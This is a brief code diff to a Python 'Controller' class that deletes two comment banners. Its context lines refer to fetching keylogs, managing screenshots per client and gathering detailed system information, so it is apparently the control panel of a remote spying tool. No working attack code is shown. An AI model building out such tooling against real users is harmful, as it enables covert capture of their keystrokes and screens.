@@ -560,7 +560,6 @@ class Controller:
             print(f"[-] Error fetching keylogs: {e}")
     
     
-    # ==================== SCREENSHOT MANAGEMENT ====================
     
     def screenshot_management_menu(self, client_id):
         while True:
@@ -626,7 +625,6 @@ class Controller:
             print(f"[-] Error saving screenshot: {e}")
     
     
-    # ==================== DETAILED SYSTEM INFO ====================
     
     def handle_detailed_system_info(self, client_id):
         print("\n[+] Getting detailed system information...")
